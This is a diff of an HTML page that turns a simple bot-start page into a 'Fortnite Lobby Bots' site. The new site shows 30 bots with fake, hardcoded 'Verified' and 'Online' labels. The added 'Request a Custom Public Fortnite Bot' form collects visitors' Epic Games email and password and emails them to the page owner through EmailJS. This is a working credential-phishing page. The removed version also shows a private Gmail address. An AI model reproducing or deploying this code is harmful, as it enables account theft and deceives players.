@@ -1,157 +1,339 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send Message</title>
-    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-    <style>
-        /* General Reset */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Fortnite Lobby Bots</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: #121212;
+      color: #fff;
+    }
 
-        /* Body Styling */
-        body {
-            background-color: #0a0a0a;
-            color: #ffffff;
-            font-family: 'Arial', sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 40px 20px;
-            text-align: center;
-        }
+    header {
+      padding: 2rem;
+      text-align: center;
+      background: #1e1e2f;
+    }
 
-        /* Container Styling */
-        .container {
-            max-width: 1200px;
-            width: 100%;
-        }
+    header h1 {
+      margin: 0;
+      font-size: 2rem;
+    }
 
-        /* Heading Styling */
-        h1 {
-            font-size: 3rem;
-            margin-bottom: 20px;
-            font-weight: bold;
-        }
+    #search {
+      margin-top: 1rem;
+      padding: 10px;
+      width: 250px;
+      font-size: 1rem;
+      border: none;
+      border-radius: 5px;
+    }
 
-        /* Paragraph Styling */
-        p {
-            font-size: 1.2rem;
-            margin-bottom: 30px;
-            color: #a0a0a0;
-        }
+    .container {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 1.5rem;
+      padding: 2rem;
+    }
 
-        /* Button Styling */
-        .start-button {
-            background-color: #007bff;
-            color: #ffffff;
-            border: none;
-            padding: 15px 30px;
-            font-size: 1.2rem;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-            margin-bottom: 20px;
-            display: block;
-            width: 200px;
-            text-decoration: none;
-            text-align: center;
-        }
+    .bot-card {
+      background: #1f1f2f;
+      border-radius: 10px;
+      text-align: center;
+      padding: 1rem;
+      cursor: pointer;
+      transition: 0.2s ease;
+    }
 
-        .start-button:hover {
-            background-color: #0056b3;
-        }
+    .bot-card:hover {
+      background: #292945;
+    }
 
-        /* Bots Section Styling */
-        .bots-section {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
-            width: 100%;
-        }
+    .bot-card img {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      margin-bottom: 0.5rem;
+      object-fit: cover;
+    }
 
-        .bot-card {
-            background-color: #1a1a1a;
-            border-radius: 10px;
-            padding: 20px;
-            text-align: left;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-        }
+    .bot-name {
+      font-size: 1.1rem;
+      font-weight: bold;
+    }
 
-        .bot-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
-        }
+    .bot-desc {
+      font-size: 0.85rem;
+      color: #ccc;
+      margin: 0.4rem 0;
+    }
 
-        .bot-icon {
-            width: 50px;
-            height: 50px;
-            background-color: #007bff;
-            border-radius: 10px;
-            margin-bottom: 15px;
-        }
+    .bot-status {
+      font-size: 0.9rem;
+      font-weight: bold;
+    }
 
-        .bot-name {
-            font-size: 1.5rem;
-            font-weight: bold;
-            margin-bottom: 10px;
-        }
+    .online { color: #4caf50; }
+    .offline { color: #f44336; }
 
-        .bot-description {
-            font-size: 1rem;
-            color: #a0a0a0;
-        }
-    </style>
-    <script>
-        (function() {
-            emailjs.init("_LWCqwpyuI9ZaRPSb"); // Replace with your EmailJS user ID
-        })();
+    .verified-badge {
+      background: #4caf50;
+      color: white;
+      font-size: 0.7rem;
+      padding: 2px 6px;
+      border-radius: 5px;
+      margin-left: 6px;
+      vertical-align: middle;
+      font-weight: bold;
+    }
 
-        function sendMessage() {
-            let timestamp = new Date().toLocaleString();
-            let logEntry = "Start button clicked at: " + timestamp;
+    .bot-region {
+      font-size: 0.8rem;
+      color: #bbb;
+      margin-top: 0.5rem;
+    }
 
-            // Save log entry to localStorage
-            let logs = JSON.parse(localStorage.getItem("logs")) || [];
-            logs.push(logEntry);
-            localStorage.setItem("logs", JSON.stringify(logs));
+    /* Modal */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 999;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.75);
+      justify-content: center;
+      align-items: center;
+    }
 
-            // Send email using EmailJS
-            emailjs.send("service_tgr9z8f", "template_ky2ldtq", {
-                to_email: "baileyksmith2010@gmail.com",
-                message: logEntry
-            }).then(function(response) {
-                alert("Message sent successfully!");
-            }, function(error) {
-                alert("Failed to send message: " + JSON.stringify(error));
-            });
-        }
-    </script>
+    .modal-content {
+      background: #2d2d3f;
+      padding: 2rem;
+      border-radius: 10px;
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+      color: #fff;
+      position: relative;
+    }
+
+    .modal-content img {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+    }
+
+    .close {
+      position: absolute;
+      top: 10px;
+      right: 20px;
+      font-size: 1.5rem;
+      cursor: pointer;
+    }
+
+    .chat-box {
+      margin-top: 1.5rem;
+      background: #333;
+      padding: 10px;
+      border-radius: 8px;
+      max-height: 200px;
+      overflow-y: auto;
+      text-align: left;
+    }
+
+    .chat-box .chat-message {
+      margin-bottom: 10px;
+    }
+
+    .chat-box .chat-message.bot {
+      color: #4caf50;
+    }
+
+    .chat-box .chat-message.user {
+      color: #fff;
+    }
+
+    .chat-input {
+      width: 100%;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #444;
+      margin-top: 10px;
+      background: #222;
+      color: #fff;
+      font-size: 1rem;
+    }
+
+    /* Custom Bot Request Overlay */
+    .overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      justify-content: center;
+      align-items: center;
+    }
+
+    .overlay-content {
+      background: #2d2d3f;
+      padding: 2rem;
+      border-radius: 10px;
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+    }
+
+    .overlay input {
+      margin: 0.5rem 0;
+      padding: 0.5rem;
+      width: 100%;
+      border-radius: 5px;
+      border: 1px solid #444;
+      background: #222;
+      color: #fff;
+    }
+
+    .overlay button {
+      margin-top: 1rem;
+      padding: 0.7rem 1.5rem;
+      background: #4caf50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Welcome</h1>
-        <p>Click the button below to start the bots. (might take 5-20 minutes also you can only turn it on at about 8am till 10pm uk time because my pc needs to be on for you to start the bots)
-       .</p>
-        <button class="start-button" onclick="sendMessage()">Start</button>
 
-        <!-- Bots Section -->
-        <div class="bots-section">
-            <div class="bot-card"><div class="bot-icon"></div><div class="bot-name">OGsbot1</div><div class="bot-description">Drops Tilted Towers every time. Still dies first.</div></div>
-            <div class="bot-card"><div class="bot-icon"></div><div class="bot-name">OGsbot2</div><div class="bot-description">Builds a mansion in 2 seconds. Forgets to add doors.</div></div>
-            <div class="bot-card"><div class="bot-icon"></div><div class="bot-name">OGsbot3</div><div class="bot-description">Carries 10 medkits. Still dies to fall damage.</div></div>
-            <div class="bot-card"><div class="bot-icon"></div><div class="bot-name">OGsbot4</div><div class="bot-description">Camps in a bush. Wins by doing absolutely nothing.</div></div>
-            <div class="bot-card"><div class="bot-icon"></div><div class="bot-name">OGsbot5</div><div class="bot-description">Always has a golden scar. Misses every shot.</div></div>
-            <div class="bot-card"><div class="bot-icon"></div><div class="bot-name">OGsbot6</div><div class="bot-description">Dances after every kill. Gets sniped mid-emote.</div></div>
-            <div class="bot-card"><div class="bot-icon"></div><div class="bot-name">OGsbot7</div><div class="bot-description">Rides a shopping cart into the storm. No regrets.</div></div>
-            <div class="bot-card"><div class="bot-icon"></div><div class="bot-name">OGsbot8</div><div class="bot-description">Steals your loot. Blames it on lag.</div></div>
-            <div class="bot-card"><div class="bot-icon"></div><div class="bot-name">OGsbot9</div><div class="bot-description">Always revives you. In the middle of a firefight.</div></div>
-            <div class="bot-card"><div class="bot-icon"></div><div class="bot-name">OGsbot10</div><div class="bot-description">Throws grenades like confetti. Accidentally blows itself up.</div></div>
-        </div>
+<header>
+  <h1>Fortnite Lobby Bots</h1>
+  <input type="text" id="search" placeholder="Search OGsbot..." />
+  <!-- Request a custom public Fortnite Bot Button -->
+  <button id="requestBotBtn">Request a Custom Public Fortnite Bot</button>
+</header>
+
+<div class="container" id="botContainer"></div>
+
+<!-- Modal -->
+<div class="modal" id="botModal">
+  <div class="modal-content">
+    <span class="close" onclick="closeModal()">&times;</span>
+    <img id="modalAvatar" src="" alt="Bot Avatar" />
+    <h2 id="modalName"></h2>
+    <p id="modalDesc"></p>
+    <p><strong>Status:</strong> <span id="modalStatus"></span></p>
+    <p><strong>Uptime (1/7/30 days):</strong><br><span id="modalUptime"></span></p>
+    <p id="modalRegion" class="bot-region"></p>
+
+    <!-- Chat Box -->
+    <div class="chat-box" id="chatBox"></div>
+    <input type="text" id="chatInput" class="chat-input" placeholder="Type a message..." onkeydown="sendChat(event)" />
+  </div>
+</div>
+
+<!-- Custom Bot Request Overlay -->
+<div class="overlay" id="customBotOverlay">
+  <div class="overlay-content">
+    <h2>Create Your Custom Public Fortnite Bot</h2>
+    <p>Please create an Epic Games account to request a custom bot.</p>
+    <a href="https://www.epicgames.com/id/register" target="_blank">
+      <button>Go to Epic Games Registration</button>
+    </a>
+    <div>
+      <label for="epicEmail">Epic Games Email:</label>
+      <input type="email" id="epicEmail" placeholder="Enter your Epic Games email" />
+      <label for="epicPassword">Epic Games Password:</label>
+      <input type="password" id="epicPassword" placeholder="Enter your Epic Games password" />
     </div>
+    <button onclick="submitRequest()">Submit</button>
+  </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script>
+  emailjs.init('qOPykaVViVTGCwwbb'); // Replace with your EmailJS public key
+
+  const container = document.getElementById("botContainer");
+  const descriptions = [
+    "Builds like a pro... until they forget to add a roof.",
+    "Thinks 'Good game!' is an emote.",
+    "Wears Fishstick skin but doesn't know how to fish.",
+    "Just tried to land in Tilted, ended up in the water.",
+    "Thinks they’re in a fashion show. And, they’re winning.",
+  ];
+
+  function renderBots() {
+    container.innerHTML = "";
+    for (let i = 1; i <= 30; i++) {
+      const div = document.createElement("div");
+      div.className = "bot-card";
+      div.innerHTML = `
+        <img src="https://robohash.org/OGsbot${i}?set=set3" alt="OGsbot${i}">
+        <div class="bot-name">
+          OGsbot${i} <span class="verified-badge">✔️ Verified</span>
+        </div>
+        <div class="bot-desc">${descriptions[i % descriptions.length]}</div>
+        <div class="bot-status online">🟢 Online</div>
+        <p class="bot-region">Oregon (US West)</p>
+      `;
+      div.onclick = () => showModal(i);
+      container.appendChild(div);
+    }
+  }
+
+  function showModal(index) {
+    document.getElementById("modalAvatar").src = `https://robohash.org/OGsbot${index}?set=set3`;
+    document.getElementById("modalName").innerHTML = `OGsbot${index} <span class="verified-badge">✔️ Verified</span>`;
+    document.getElementById("modalDesc").textContent = descriptions[index % descriptions.length];
+    document.getElementById("modalStatus").textContent = "🟢 Online";
+    document.getElementById("modalRegion").textContent = "Oregon (US West)";
+    document.getElementById("botModal").style.display = "flex";
+  }
+
+  function closeModal() {
+    document.getElementById("botModal").style.display = "none";
+  }
+
+  // Show overlay when button is clicked
+  document.getElementById("requestBotBtn").addEventListener("click", () => {
+    document.getElementById("customBotOverlay").style.display = "flex";
+  });
+
+  function submitRequest() {
+    const email = document.getElementById("epicEmail").value;
+    const password = document.getElementById("epicPassword").value;
+
+    if (!email || !password) {
+      alert("Please fill in both email and password.");
+      return;
+    }
+
+    const templateParams = {
+      email: email,
+      password: password,
+    };
+
+    emailjs.send('service_rqsh5qv', 'template_hrff558', templateParams)
+      .then(response => {
+        alert('Request submitted successfully!');
+        document.getElementById("customBotOverlay").style.display = "none";
+      })
+      .catch(error => {
+        alert('Error submitting request: ' + error.text);
+      });
+  }
+
+  // Initialize the bots
+  renderBots();
+</script>
+
 </body>
 </html>
